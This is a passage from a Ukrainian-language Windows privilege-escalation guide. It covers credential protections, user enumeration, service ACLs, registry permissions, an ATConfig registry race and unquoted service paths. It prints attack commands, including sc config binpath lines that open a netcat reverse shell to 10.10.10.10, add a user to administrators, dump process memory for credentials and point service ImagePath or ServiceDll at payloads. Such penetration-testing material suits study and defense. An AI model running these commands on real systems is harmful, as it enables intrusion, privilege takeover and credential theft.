**LAPS** призначений для **керування паролями локального Administrator**, гарантуючи, що на комп’ютерах, приєднаних до домену, кожен пароль є **унікальним, випадковим і регулярно оновлюється**. Ці паролі надійно зберігаються в Active Directory, і доступ до них мають лише користувачі з достатніми дозволами через ACLs, що дає їм змогу переглядати паролі локального адміністратора за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо функція активна, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладніше про Credential Guard можна дізнатися тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються доменні облікові дані.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся більше про привілейовані групи та про те, як зловживати ними для підвищення привілеїв, тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Дізнайтеся більше** про те, що таке **token**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** і про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, що ввійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, переглядаючи процеси, **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл**, або чи маєте права на запис у папку з бінарним файлом, щоб скористатися потенційними [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md): ними можна скористатися для підвищення привілеїв.

Debugger listener може бути недовговічним, тому його відсутність у знімку портів, отриманому пасивним способом, не доводить, що він ніколи не був доступний. Зіставляйте виявлений listener із його PID, власником процесу та можливістю користувача з нижчими привілеями підключитися до нього; сама назва програми або debug flag не доводять, що можна виконати код від імені іншого користувача. Під час звичайного збору даних обмежуйтеся пасивним переліком і не надсилайте debugger-команди.

**Перевірка дозволів бінарних файлів процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів папок із бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати спільні бібліотеки з `dynamicpreprocessor directory`, оголошеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Для запланованого завдання або служби, що запускає Snort під іншим обліковим записом, перевірте саме цю конфігурацію та ACL оголошеного каталогу модулів. Якщо ваш токен дозволяє створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів і будь-які обмеження deny або спільного доступу; сам факт доступу на запис до каталогу не доводить можливість підвищення привілеїв. [Документація Snort щодо динамічних препроцесорів](https://www.snort.org/documents/dpx-readme) описує завантаження модулів під час виконання.

### Привілейована вебслужба з кореневим каталогом документів, доступним для запису

Установлюючи Apache на Windows, порівняйте шлях до виконуваного файла служби та обліковий запис запуску зі значенням `DocumentRoot` в активному `httpd.conf`. Для типової конфігурації XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, виконання коду на стороні сервера може перетнути межу привілеїв вузла. Переконайтеся, що служба працює, що саме цей шлях обслуговується та що обробник на стороні сервера обробляє цей тип файлів; сам факт доступу на запис до кореневого каталогу підтверджує лише можливість створення файлів. Перевірте ACL, не записуючи пробний файл:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартного встановлення WAMP служба може вказувати на версійний `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація поруч із ним — у `conf\httpd.conf`, із кореневим каталогом за замовчуванням `C:\wamp64\www` або `C:\wamp\www`. Разом перевірте точний образ служби, обліковий запис, від імені якого вона працює, ефективний `DocumentRoot` (включно з розгортанням `${INSTALL_DIR}` та перевизначеннями віртуальних хостів) і ACL кореневого каталогу. Доступність для запису каталогу WAMP не доводить, що Apache працює як `SYSTEM` або виконує надісланий файл. [В Apache описано, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережеве посвідчення пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а тоді визначте налаштований пул і серверний обробник. Код у каталозі, що обслуговується, виконується від імені пулу лише за умови, що IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати доступний для запису каталог можливістю виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час роботи, обробник і перевизначення для конкретного шляху.

Динамічна компіляція ASP.NET — окремий шлях, який варто перевірити: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідному каталозі встановлення .NET Framework, але параметр застосунку `<compilation tempDirectory>` може його змінити. [Microsoft описує розташування та підкаталоги для кожного застосунку](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчими привілеями може змінити згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи компілює застосунок його повторно з привілейованішим [посвідченням робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Сам по собі ACL файлу чи каталогу не доводить можливість виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, посвідченням процесу та часом повторної компіляції. Перевіряйте метадані лише для читання; під час переліку не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до ресурсів домену як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низькі привілеї. `LocalSystem` уже має високі локальні привілеї та також використовує обліковий запис комп’ютера в мережі; `LocalService` зазвичай використовує анонімні мережеві облікові дані. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft описує ці типи посвідчень](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеве посвідчення пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр посвідчення не задано, можуть успадковуватися стандартні параметри пулу, які відрізняються залежно від покоління IIS, тож з’ясуйте ефективну конфігурацію, а не робіть припущення за назвою пулу. Якщо виконання коду відбувається в пулі з мережевим посвідченням облікового запису комп’ютера, оцініть права **саме цього комп’ютера** в домені. Для [DCSync](../active-directory-methodology/dcsync.md) потрібні права реплікації в контексті іменування домену; сам по собі квиток облікового запису машини чи роль хоста їх не доводить. Пасивний збір даних має обмежуватися перевіркою конфігурації та ACL, без завантаження файлів, мережевої автентифікації чи запитів квитків.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте, як значення з запиту проходить автентифікацію, розшифрування, перевірку та формування команди. Обробник, який конкатенує декодований токен у `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що ненадійний викликач справді може впливати на декодоване значення та звертатися до обробника, а тоді з’ясуйте ефективне посвідчення пулу застосунків або посвідчення після імперсонації, а також посвідчення дочірнього процесу. Рядок у доступному для читання вихідному коді, слухач на localhost або слабкість формату токена самі по собі не доводять можливість виконання команд із підвищеними привілеями. Перевіряйте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного збору даних.

Для служби PHP у Windows шлях, контрольований запитом і переданий до [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачу з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може досягти цього оператора, визначений шлях вказує на файл, який користувач із нижчими привілеями може змінити, а робочий процес — прочитати, відповідні обмеження шляхів PHP дозволяють включення, а сам робочий процес справді має вищі привілеї. Слухач на loopback або файл, доступний для запису, самі по собі не доводять наявність цього ланцюжка; під час пасивного збору даних перевіряйте вихідний код, посвідчення служби й ACL файлів, не викликаючи кінцеву точку.

### Видобування паролів із пам’яті

Ви можете створити дамп пам’яті запущеного процесу за допомогою **procdump** із sysinternals. Такі служби, як FTP, зберігають **облікові дані у відкритому вигляді в пам’яті**; спробуйте створити дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Небезпечні GUI-застосунки

**Застосунки, що працюють від SYSTEM, можуть дозволяти користувачу запускати CMD або переглядати каталоги.**

Приклад: «Windows Help and Support» (Windows + F1), пошук «command prompt», натисніть «Click to open Command Prompt»

### Імпорт файлів проєктів із підвищеними привілеями

Застосунок, який автоматично відкриває проєкти з каталогу для скидання файлів, доступного для запису користувачам із нижчими привілеями, перетинає межу довіри до вхідних даних у контексті облікового запису імпортера. Перевірте **точний шлях із правами на запис**, процес або завдання, що відкриває його, ефективну ідентичність і версію парсера. [Історична проблема Ghidra під час відкриття/відновлення проєкту](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від облікового запису імпортера, якщо це дозволяли [політики вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це потенційний витік облікових даних, а не негайний доступ адміністратора: отриману відповідь потрібно мати змогу використати через окремий авторизований або вразливий шлях, а актуальні збірки слід оцінювати з урахуванням фактичного стану виправлень. Не відкривайте спеціально створений проєкт під час пасивної розвідки; перевіряйте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об’єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит лише на читання [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із цим правом — це зачіпка для перевірки, а не доказ того, що нова служба може запускатися. [`CreateService повертає дескриптор`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби пізніше виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо можна було скористатися початковим дескриптором. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску та шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивної розвідки.

Для віддаленого шляху встановлення служби зіставте ці права SCM із ресурсом на цільовому комп’ютері, до якого **той самий мережевий сеанс входу** має право запису, його базовим ACL NTFS і локальним шляхом до виконуваного файла, який може запускати обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо одночасно наявні незвично широкі права SCM і можливість розмістити файл; адміністративний ресурс не є обов’язковою умовою. Саме по собі право запису в ресурс або наявність зачіпки щодо створення служби через SCM не доводять, що нова служба може запускатися з вищою ідентичністю.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, зупинки чи іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла розв’язується в каталог, доступний для запису користувачам із нижчими привілеями, а служба працює з вищою ідентичністю, відсутній допоміжний файл може бути потенційною ціллю для підміни за певних умов. Підтвердьте **фактичний код служби або задокументований виклик допоміжного файла**, визначений шлях до виконуваного файла та порядок пошуку, права на створення каталогу, ідентичність служби й доступний спосіб ініціювати подію життєвого циклу. Каталог служби з правами на запис або сам факт відсутності файла не доводять, що служба завантажує цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або її задокументований інтерфейс. Якщо вона використовує вибраний викликачем аргумент як шлях до журналу або експорту, перевірте ідентичність служби, точний потік передавання аргументу до операції запису, обмеження шляху та дозволи для **створеного файла**. Запис у захищений каталог може стати шляхом до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самого права запису в журнал або права запуску недостатньо. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ доступний для читання `nsclient.ini` — це **зачіпка для перевірки конфігурації**: у ньому можуть зберігатися облікові дані для вебдоступу, тоді як `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, вебслухач і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання також потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), фактичне право реєструвати чи змінювати команду та тригер, який запускає її з ідентичністю служби. Слухач, прив’язаний лише до loopback, усе одно може бути доступний локальному користувачу, але самі лише шлях до файла, пароль або слухач не доводять наявності таких прав. Під час пасивної розвідки перевіряйте метадані й дозволи, не показуючи секрети й не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебдоступу та скриптів](https://nsclient.org/docs/setup/securing/) і [конфігурацію зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби та значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає дочірній застосунок саме там](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), тоді як `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, яку надає цей дочірній процес, — окрема зачіпка для перевірки: підтвердьте, що користувач із нижчими привілеями може досягти слухача, конкретна операція приймає його вхідні дані, а дочірній процес служби виконує небезпечну операцію з вищою ідентичністю. Сам обліковий запис служби, URL кінцевої точки або шлях із правами на запис не доводять можливості підвищення привілеїв; під час пасивної розвідки не викликайте операції служби.

Для спеціальної операції WCF простежте, чи потрапляє контрольований викликачем рядок у будь-який runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding з обліковими даними Windows для транспортного рівня`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але авторизацію для виклику **конкретної** операції та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від вхідних даних, наданих викликачем із нижчими привілеями, до `AddScript`, що виконується з вищою ідентичністю служби, є межею виконання коду; сам лише відкритий порт, автентифікований клієнт або невикористовуваний метод у сторонній збірці не є доказом. Статично перевірте розгорнуту службу, контракт, авторизацію та налаштування імперсонації, не викликаючи кінцеву точку під час розвідки.

Service Triggers дають Windows змогу запускати службу за настання певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть не маючи права SERVICE_START, часто можна запускати привілейовані служби, ініціюючи їхні тригери. Методи переліку й активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

Інсталяції Visual Studio з інструментами C/C++ можуть містити `VSStandardCollectorService150` — діагностичну службу, налаштовану для роботи від `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) для перенаправлення скидання DACL служби використовували junction і race condition із посиланням диспетчера об’єктів. Для продемонстрованого підвищення привілеїв також були потрібні доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і його цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної первинної перевірки з’ясуйте обліковий запис і шлях до бінарного файла саме цієї служби, перевірте наявність шляху компілятора Setup WMI та стан виправлень установленого компонента. Сам запис служби, версія продукту Visual Studio або файл компілятора не доводять, що вузол уразливий. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримати список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується використовувати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть Authenticated Users змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Тут можна завантажити accesschk.exe для XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо виникає ця помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Не вдалося запустити службу: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Врахуйте, що для роботи служби upnphost потрібна служба SSDPSRV (у XP SP1)**

**Ще один обхідний спосіб** цієї проблеми — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

У сценарії, коли група «Authenticated users» має дозвіл **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапустити службу

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити, скориставшись різними дозволами:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Надає можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також надає можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого облікового запису домену, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна перехопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який виконує служба**, або чи маєте **дозвіл на запис у папку**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
За допомогою **wmic** (не в system32) можна отримати список усіх бінарних файлів, які виконуються службами, а потім перевірити свої дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файла служби чи каталогу, у якому він міститься. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Переконайтеся, що бінарний файл доступний для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або валідний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи спрацювання тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачу перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано запустити її через програму, яка її використовує.

### Дозволи на зміну реєстру служб

Слід перевірити, чи можете ви змінювати реєстр будь-якої служби.\
Ви можете **перевірити** свої **дозволи** на реєстр **служби**, виконавши:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Початковий тест дозволів формулювався так:

Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який запускає служба, можна змінити.

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис у реєстрі для певного ключа служби. Самого запису ACL недостатньо, щоб підтвердити ефективний доступ: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для підвищення привілеїв також потрібні доступне для зміни поле конфігурації служби, спосіб запустити службу та обліковий запис служби з вищими привілеями. Див. довідку Microsoft про [права доступу до ключів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [права доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до бінарного файлу, який запускається:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка symbolic link у реєстрі для запису довільного значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіюються процесом **SYSTEM** у ключ сеансу HKLM. **Гонка symbolic link** у реєстрі може перенаправити цей привілейований запис у **будь-який шлях HKLM**, надаючи примітив для **запису довільного значення** в HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого стола; користувач може записувати в цей ключ.

Схема експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке потрібно записати від імені SYSTEM.
2. Запустіть копіювання для захищеного робочого стола (наприклад, **LockWorkstation**), що ініціює робочий процес AT broker.
3. **Виграйте гонку**, установивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищений цільовий ключ HKLM.
4. SYSTEM записує вибране зловмисником значення за перенаправленим шляхом HKLM.

Отримавши можливість записувати довільні значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** реалізація публічного експлойта **блокує робочу станцію** під час гонки.

Приклад інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл на реєстр, це означає, що **ви можете створювати підрозділи реєстру в ньому**. У випадку служб Windows цього **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Неекрановані шляхи до служб

Якщо шлях до виконуваного файлу не взято в лапки, Windows намагатиметься виконати всі варіанти шляху, що закінчуються перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows намагатиметься виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб без лапок, за винятком тих, що належать до вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
